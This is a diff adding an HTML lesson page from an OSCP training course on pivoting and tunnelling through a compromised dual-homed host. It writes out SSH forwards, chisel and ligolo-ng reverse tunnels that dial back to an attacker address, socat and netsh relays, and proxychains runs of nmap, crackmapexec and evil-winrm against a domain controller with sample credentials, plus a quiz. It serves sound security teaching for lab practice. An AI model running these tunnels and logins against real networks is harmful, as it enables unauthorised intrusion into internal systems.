@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lesson 13 · Pivoting &amp; Tunneling</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="../reference/links.html">Links</a> · <a href="./0012-active-directory-lateral-movement.html">Lesson 12</a> · <strong>Lesson 13</strong> · <a href="../reference/pivoting.html">Pivoting</a> · <a href="../reference/glossary.html">Glossary</a></nav>
+
+<span class="kicker">Lesson 13 · Pivoting</span>
+<h1>Pivoting &amp; Tunneling</h1>
+<p class="meta">Mission: pass the OSCP+ exam · Your win today: reach and attack a host on an internal subnet you can't touch directly, by routing through a box you own.</p>
+
+<p class="lead">The Active Directory set — the 40-point centrepiece — usually doesn't sit on the network you can reach from Kali. It lives <em>behind</em> a compromised, dual-homed host: one machine with two network cards, one foot in the subnet you can touch and one in the subnet you can't. <strong>Pivoting</strong> is how you make your Kali tools see through that machine into the hidden network. You already understand routing and sockets; the new muscle is wiring a tunnel through a box you own and pointing your existing toolkit down it.</p>
+
+<div class="box note">
+<span class="box-title">The picture to hold in your head</span>
+You have a shell on <code>HOST1</code>. It has two NICs: <code>10.10.10.5</code> (the network you reached it on) and <code>172.16.5.5</code> (an internal subnet your Kali box can't even ping). The Domain Controller and the rest of the AD set live on <code>172.16.5.0/24</code>. Your job: turn <code>HOST1</code> into a doorway so <code>nmap</code>, <code>crackmapexec</code>, and <code>evil-winrm</code> on Kali can talk to <code>172.16.5.10</code> as if it were local.
+</div>
+
+<h2>The three forwarding concepts (learn these once)</h2>
+<p>Every pivoting tool is a variation on three ideas. SSH names them cleanly, so learn them through SSH first — the concepts carry over to chisel and ligolo unchanged.</p>
+<table>
+<thead><tr><th>Concept</th><th>SSH flag</th><th>What it does</th><th>Use it when</th></tr></thead>
+<tbody>
+<tr><td><strong>Local forward</strong></td><td><code>-L</code></td><td>Bind a port on <em>your</em> localhost that tunnels to a service reachable from the pivot</td><td>You want one specific remote service on a local port (e.g. an internal web app)</td></tr>
+<tr><td><strong>Remote forward</strong></td><td><code>-R</code></td><td>Bind a port on the <em>target</em> that tunnels back to a service on your machine</td><td>The victim can't reach you (egress-filtered) — push a path back to your listener</td></tr>
+<tr><td><strong>Dynamic / SOCKS</strong></td><td><code>-D</code></td><td>Open a SOCKS proxy that routes <em>any</em> tool into the remote network on demand</td><td>You want your whole toolkit to reach the hidden subnet — the default for pivoting</td></tr>
+</tbody>
+</table>
+<p>The one to internalise is <strong>dynamic / SOCKS</strong>. Local forwards are one service at a time; a SOCKS proxy is a generic on-ramp — point any TCP tool at it and it pops out on the far network. That's why almost every OSCP pivot is "stand up a SOCKS proxy, then run my tools through it."</p>
+
+<h2>proxychains — feeding tools into a SOCKS proxy</h2>
+<p>A SOCKS proxy is useless until your tools actually use it. <strong>proxychains</strong> is the glue: it hooks a program's network calls and forces them through the proxy. Configure it once in <code>/etc/proxychains4.conf</code> — scroll to the bottom and set the proxy line:</p>
+<pre><span class="p">$</span> <span class="o">tail -n3 /etc/proxychains4.conf</span>
+<span class="o">[ProxyList]</span>
+<span class="c"># point at whatever local port your tunnel opened</span>
+<span class="o">socks5 127.0.0.1 1080</span></pre>
+<p>Now prefix any TCP tool with <code>proxychains</code> and it travels down the tunnel onto the internal subnet:</p>
+<pre><span class="p">$</span> <span class="o">proxychains nmap -sT -Pn -p445,3389,5985 172.16.5.10</span>
+<span class="p">$</span> <span class="o">proxychains crackmapexec smb 172.16.5.10 -u admin -p 'Passw0rd!'</span>
+<span class="p">$</span> <span class="o">proxychains evil-winrm -i 172.16.5.10 -u admin -p 'Passw0rd!'</span></pre>
+
+<div class="box warn">
+<span class="box-title">SOCKS carries TCP only — scan accordingly</span>
+A SOCKS proxy moves <strong>TCP</strong> and nothing else. So for nmap through proxychains you <em>must</em> use <code>-sT</code> (TCP connect, not the default SYN scan) and <code>-Pn</code> (skip host discovery — ICMP ping won't traverse the tunnel and every host looks "down"). UDP scans and ping sweeps simply won't work through SOCKS. Expect it to be <strong>slow</strong>: scan only the ports you care about (<code>-p445,3389,5985</code>), not all 65535.
+</div>
+
+<h2>SSH tunnelling in practice</h2>
+<p>If you recovered SSH credentials (or a key) for the pivot — common when the pivot is Linux — SSH gives you all three forwards with one binary that's already on the box. From Kali:</p>
+<pre><span class="p">$</span> <span class="o">ssh -D 1080 user@10.10.10.5</span>            <span class="c"># dynamic SOCKS on local :1080 — the workhorse</span>
+<span class="p">$</span> <span class="o">ssh -L 8080:172.16.5.10:80 user@10.10.10.5</span>  <span class="c"># local fwd: internal web app on your :8080</span>
+<span class="p">$</span> <span class="o">ssh -R 9001:127.0.0.1:9001 user@10.10.10.5</span>  <span class="c"># remote fwd: push your listener onto the pivot</span></pre>
+<p>The <code>-D</code> line is the one you'll reach for: open it, set proxychains to <code>socks5 127.0.0.1 1080</code>, and your whole toolkit can now reach <code>172.16.5.0/24</code>. The <code>-L</code> line is for when you just need one internal service in your browser. The <code>-R</code> line is the <strong>reverse case</strong>: if a deeper victim can't route back to Kali but <em>can</em> reach the pivot, you push a port from the pivot back through your SSH session to your own listener.</p>
+
+<h3>Double pivot with jump hosts</h3>
+<p>When the AD set is two hops deep — Kali → <code>HOST1</code> → <code>HOST2</code> → the real targets — SSH's <code>-J</code> (ProxyJump) chains the hops for you without juggling sessions by hand:</p>
+<pre><span class="p">$</span> <span class="o">ssh -J user@10.10.10.5 user2@172.16.5.6</span>       <span class="c"># transparently hop through HOST1 to HOST2</span>
+<span class="p">$</span> <span class="o">ssh -J user@10.10.10.5 -D 1081 user2@172.16.5.6</span>  <span class="c"># open a SOCKS proxy on the *third* network</span></pre>
+<p>That second proxy (<code>:1081</code>) reaches a network only <code>HOST2</code> can see — a <strong>double pivot</strong>. Add a second proxy line to proxychains and you're enumerating the third subnet. You generally won't need more than two hops on the OSCP, but the pattern scales.</p>
+
+<h2>chisel — when you only have a shell, no SSH</h2>
+<p>Often the pivot is a Windows box, or a Linux box where you have a reverse shell but no SSH credentials. <strong>chisel</strong> is the answer: a single Go binary (you drop the right build on the victim) that tunnels a SOCKS proxy over HTTP. The standard play is a <em>reverse</em> SOCKS — the victim dials back to you, which sails past inbound firewall rules.</p>
+<p>On Kali (the <strong>server</strong>, listening):</p>
+<pre><span class="p">$</span> <span class="o">chisel server -p 8000 --reverse</span>
+<span class="o">server: Reverse tunnelling enabled</span>
+<span class="o">server: Listening on http://0.0.0.0:8000</span></pre>
+<p>On the victim (the <strong>client</strong>, dialling back — <code>R:socks</code> means "reverse SOCKS"):</p>
+<pre><span class="p">C:\&gt;</span> <span class="o">chisel.exe client 10.10.14.5:8000 R:socks</span>
+<span class="o">client: Connecting to ws://10.10.14.5:8000</span>
+<span class="o">client: Connected (Latency 41ms)</span></pre>
+<p>chisel now opens a SOCKS proxy on Kali's <code>127.0.0.1:1080</code> — the same endpoint proxychains already expects. You're back to <code>proxychains evil-winrm …</code>. chisel also does a plain <strong>forward port-forward</strong> if you only need a single service: <code>chisel client 10.10.14.5:8000 8080:172.16.5.10:80</code> maps the internal web app to your local <code>:8080</code> with no proxychains at all.</p>
+
+<h2>ligolo-ng — the modern favourite</h2>
+<p>If you set up one new tool from this lesson, make it <strong>ligolo-ng</strong>. Instead of a SOCKS proxy you wrap every tool in, ligolo creates a real <code>tun</code> network interface on Kali and <em>routes</em> the internal subnet through it. The internal network becomes part of your routing table — so your tools talk to <code>172.16.5.10</code> natively, <strong>no proxychains, no <code>-sT</code> juggling</strong>, and ICMP works. The workflow:</p>
+<ol class="steps">
+<li>On Kali, create the tun interface once: <code>sudo ip tuntap add user $USER mode tun ligolo</code> then <code>sudo ip link set ligolo up</code>.</li>
+<li>Start the proxy (the listener) on Kali: <code>ligolo-proxy -selfcert</code>.</li>
+<li>Drop and run the agent on the victim, pointing back at Kali: <code>agent -connect 10.10.14.5:11601 -ignore-cert</code>.</li>
+<li>In the ligolo console, <code>session</code> to select the agent, then add a route for the hidden subnet: <code>sudo ip route add 172.16.5.0/24 dev ligolo</code>, then <code>start</code>.</li>
+<li>Run anything natively: <code>nmap 172.16.5.10</code>, <code>evil-winrm -i 172.16.5.10 …</code> — no wrapper.</li>
+</ol>
+<p>ligolo also exposes a listener feature to do reverse-forward (pull a port from the internal net back to Kali) — handy for catching shells from deep targets. Cleaner and faster than proxychains; well worth the muscle memory before the exam.</p>
+
+<h2>The rest of the toolbox</h2>
+<p>You don't need all of these, but recognise them — different boxes hand you different footholds:</p>
+<table>
+<thead><tr><th>Tool</th><th>What it gives you</th><th>Reach for it when</th></tr></thead>
+<tbody>
+<tr><td><strong>sshuttle</strong></td><td>VPN-like routing over a plain SSH login — no proxychains</td><td>Linux pivot with SSH creds: <code>sshuttle -r user@10.10.10.5 172.16.5.0/24</code></td></tr>
+<tr><td><strong>plink.exe</strong></td><td>PuTTY's CLI SSH client for Windows pivots</td><td>You have a Windows shell and want an SSH tunnel out: <code>plink -R …</code></td></tr>
+<tr><td><strong>netsh portproxy</strong></td><td>Native Windows port forward, no upload needed</td><td>Living off the land: <code>netsh interface portproxy add v4tov4 …</code></td></tr>
+<tr><td><strong>socat</strong></td><td>Quick relay between two sockets</td><td>One-off port relay on a Linux pivot: <code>socat TCP-LISTEN:8080,fork TCP:172.16.5.10:80</code></td></tr>
+</tbody>
+</table>
+
+<h2>Enumerating <em>through</em> the pivot</h2>
+<p>Before you can attack the hidden network you have to discover it — from the pivot's own perspective. Once you have a shell on <code>HOST1</code>, ask the box what else it can see:</p>
+<pre><span class="p">$</span> <span class="o">ip a</span>           <span class="c"># two NICs? the second one (172.16.5.5) is your lead</span>
+<span class="p">$</span> <span class="o">ip route</span>       <span class="c"># which subnets does this host route to?</span>
+<span class="p">$</span> <span class="o">arp -a</span>         <span class="c"># neighbours it has already talked to — live hosts, free</span></pre>
+<p>On Windows the equivalents are <code>ipconfig /all</code>, <code>route print</code>, and <code>arp -a</code>. A second NIC plus an ARP cache full of <code>172.16.5.x</code> entries tells you the subnet exists and hands you live hosts for free. <em>Then</em> stand up your SOCKS proxy (or ligolo route) and scan/attack those hosts. If one of <em>them</em> turns out to be dual-homed into a third network, repeat the whole process from there — that's <strong>double-pivoting</strong>.</p>
+
+<div class="box tip">
+<span class="box-title">Pivot hygiene that saves the exam</span>
+Write the topology in your notes the moment you find it: which host is the pivot, its two IPs, the hidden subnet, and the exact tunnel command you ran. When a shell dies at hour 18, you want to rebuild the pivot in 30 seconds, not rediscover it. The AD set is 40 points — losing the pivot loses all of them.
+</div>
+
+<h2>Worked example — chisel SOCKS to a host you couldn't reach</h2>
+<p>You own <code>HOST1</code> (<code>10.10.10.5</code>, also <code>172.16.5.5</code>). Kali is <code>10.10.14.5</code>. The DC at <code>172.16.5.10</code> is invisible to Kali. Stand up a reverse SOCKS through chisel and walk straight in.</p>
+<p>Kali — start the chisel server:</p>
+<pre><span class="p">$</span> <span class="o">chisel server -p 8000 --reverse</span>
+<span class="o">server: Reverse tunnelling enabled</span>
+<span class="o">server: Listening on http://0.0.0.0:8000</span></pre>
+<p>On <code>HOST1</code> (you uploaded the matching chisel build) — dial back with reverse SOCKS:</p>
+<pre><span class="p">$</span> <span class="o">./chisel client 10.10.14.5:8000 R:socks</span>
+<span class="o">client: Connected (Latency 38ms)</span></pre>
+<p>Kali — point proxychains at the new proxy, then scan and attack the DC through it:</p>
+<pre><span class="p">$</span> <span class="o">grep -A2 ProxyList /etc/proxychains4.conf</span>
+<span class="o">[ProxyList]</span>
+<span class="o">socks5 127.0.0.1 1080</span>
+
+<span class="p">$</span> <span class="o">proxychains nmap -sT -Pn -p445,5985 172.16.5.10</span>
+<span class="o">PORT     STATE SERVICE</span>
+<span class="h">445/tcp  open  microsoft-ds</span>
+<span class="h">5985/tcp open  wsman</span>
+
+<span class="p">$</span> <span class="o">proxychains evil-winrm -i 172.16.5.10 -u admin -p 'Passw0rd!'</span>
+<span class="o">*Evil-WinRM* PS C:\Users\admin\Documents&gt; whoami</span>
+<span class="h">corp\admin</span></pre>
+<p>You just attacked a host Kali couldn't even ping ten minutes ago. The reusable pattern: <em>get a shell on the dual-homed box → discover the second subnet → tunnel a SOCKS proxy back → run your normal toolkit through it.</em> Master this and the entire AD set — all 40 points — opens up.</p>
+
+<div class="box mantra">
+You don't need a new exploit for the hidden network.<br>
+You need a doorway, and you already own the door.
+</div>
+
+<h2>Check yourself</h2>
+<p>Retrieve before you reason — feedback appears under each.</p>
+<div class="quiz" id="quiz"></div>
+
+<div class="primary">
+<span class="box-title">▶ Primary source — the pivoting reference you'll reopen</span>
+HackTricks' <a href="https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html">Tunneling and Port Forwarding</a> page is the one-stop catalogue — SSH forwards, proxychains, chisel, ligolo, plink, netsh and more, all with copy-pasteable commands. Read it once end to end, then keep it open as a lookup while you drill a two-network lab.<sup class="ref"><a href="#s1">1</a></sup>
+</div>
+
+<div class="box tip">
+<span class="box-title">Do this before Lesson 14</span>
+On a two-network lab — HTB <strong>Dante</strong> is purpose-built for multi-network pivoting, or use any box with a second NIC — get a shell on the dual-homed host, set up a SOCKS pivot (SSH <code>-D</code>, chisel, or ligolo), and reach a host you couldn't touch before. Confirm it with one <code>proxychains nmap -sT -Pn</code> that returns an open port on the internal subnet, and record the exact tunnel command in your box notes.
+</div>
+
+<div class="box note">
+<span class="box-title">Practice these boxes</span>
+<strong>Pivot a real network:</strong> HTB <strong>Dante</strong> Pro Lab is the canonical playground; PEN-200 <strong>OSCP B/C</strong> and <strong>Relia / Skylark</strong> force tunnelling to an internal DC. <a href="../reference/practice-boxes.html#pb-13">→ Full box map for this lesson</a>.
+</div>
+
+<div class="teacher">
+<span class="box-title">I'm your teacher — ask me anything</span>
+Stuck on a tunnel that won't carry your tools, or unsure which forward you need? Paste me your <code>ip a</code> output and the topology and we'll wire the pivot together. Next: <strong>Lesson 14 — Post-Exploitation: Looting &amp; Credential Harvesting</strong> — once you're on the inside, what to grab and how to turn it into the next foothold.
+</div>
+
+<h2>Sources</h2>
+<ol class="sources">
+<li id="s1"><a href="https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html">HackTricks — Tunneling and Port Forwarding</a> (the full catalogue of pivoting techniques). Tools: <a href="https://github.com/nicocha30/ligolo-ng">ligolo-ng</a> · <a href="https://github.com/jpillora/chisel">chisel</a>. Practice ground: HTB <a href="https://www.hackthebox.com/">Dante</a> Pro Lab (multi-network pivoting). Local commands: <a href="../reference/pivoting.html">Pivoting cheatsheet</a>.</li>
+</ol>
+
+<footer>
+<span><a href="./0012-active-directory-lateral-movement.html">← Lesson 12: Active Directory: Lateral Movement to Domain Admin</a></span>
+<span><a href="./0014-post-exploitation-looting.html">Next → Lesson 14: Post-Exploitation — Looting &amp; Credential Harvesting</a></span>
+</footer>
+
+<script src="../assets/quiz.js"></script>
+<script>
+renderQuiz('quiz', [
+  {
+    prompt: "You want your whole Kali toolkit — nmap, crackmapexec, evil-winrm — to reach a hidden subnet through one tunnel. Which SSH forward do you set up?",
+    options: ["Dynamic / SOCKS (ssh -D)", "Local forward (ssh -L)", "Remote forward (ssh -R)", "A jump host (ssh -J) alone"],
+    answer: 0,
+    explain: "A dynamic SOCKS proxy is generic — point any TCP tool at it and it routes onto the remote network; -L only forwards one service."
+  },
+  {
+    prompt: "You run nmap through proxychains and every host shows as down or the scan hangs. What's the fix?",
+    options: ["Use -sT -Pn and scan few ports", "Switch to a UDP scan with -sU", "Add -sn for a ping sweep first", "Raise the timing to -T5 only"],
+    answer: 0,
+    explain: "SOCKS carries TCP only, so use connect scan (-sT) and skip ICMP discovery (-Pn); ping and UDP can't traverse the proxy."
+  },
+  {
+    prompt: "You have a reverse shell on a Windows pivot but no SSH credentials. What's the cleanest way to get a SOCKS proxy onto the internal network?",
+    options: ["chisel reverse SOCKS to your server", "ssh -D 1080 from your Kali box", "An ssh -J ProxyJump chain", "sshuttle -r against the pivot"],
+    answer: 0,
+    explain: "With only a shell, drop chisel and run a reverse SOCKS (server on Kali, client R:socks on the victim); the SSH-based options need SSH access on the pivot."
+  },
+  {
+    prompt: "A deeper victim can't route back to your Kali listener but can reach the pivot you own. Which forward gets your payload a path home?",
+    options: ["Remote forward (ssh -R)", "Local forward (ssh -L)", "Dynamic / SOCKS (ssh -D)", "sshuttle VPN routing"],
+    answer: 0,
+    explain: "A remote forward pushes a port from the target/pivot back to a service on your machine — exactly the egress-filtered, victim-can't-reach-you case."
+  },
+  {
+    prompt: "You just got a shell on a box and suspect it's dual-homed. Which commands confirm the second subnet exists and reveal live hosts?",
+    options: ["ip a, ip route, arp -a", "sudo -l and id only", "nmap -sn from Kali", "ssh -D then proxychains"],
+    answer: 0,
+    explain: "From the pivot, ip a / ipconfig shows a second NIC, ip route shows the subnet it routes to, and arp -a lists neighbours it has already contacted."
+  },
+  {
+    prompt: "What's the main practical advantage of ligolo-ng over a proxychains-plus-SOCKS setup?",
+    options: ["A tun route lets tools run natively", "It needs no agent on the victim", "It tunnels UDP over a SOCKS proxy", "It works without any listener on Kali"],
+    answer: 0,
+    explain: "ligolo adds a tun interface and routes the subnet into your routing table, so tools (and ICMP) work natively with no proxychains wrapper or -sT workaround."
+  }
+]);
+</script>
+
+</body>
+</html>
